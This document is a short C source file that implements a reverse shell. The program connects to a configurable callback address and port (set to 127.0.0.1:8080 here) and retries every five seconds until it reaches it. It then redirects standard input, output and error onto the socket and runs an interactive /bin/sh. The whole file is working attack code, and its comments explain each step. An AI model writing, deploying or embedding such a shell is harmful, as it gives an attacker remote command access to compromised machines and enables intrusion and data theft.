#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

int main(void)
{
	int i; // used for dup2 later
	int sockfd; // socket file descriptor

	struct sockaddr_in srv_addr; // client address
    char *argv[] = { "/bin/sh", "-e", "-i", 0};
    char *envp[] = {"PS1=\\u@\\h \\w\\n\\$ : ", "SHELL=/bin/bash", "HISTSIZE=50",0};
    int result=0;

	srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
	srv_addr.sin_port = htons( 8080 ); // connect-back port, converted to network byte order
	srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect-back ip , converted to network byte order

	// create new TCP socket
	sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

	// connect socket
	result = connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
    if (result == -1){
        while (result != 0){
            sleep(5);
            result = connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
        }
    }

	// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
	for (i = 0; i <= 2; i++){
		dup2(sockfd, i);
    }
	// magic
	execve(argv[0], &argv[0], envp);
}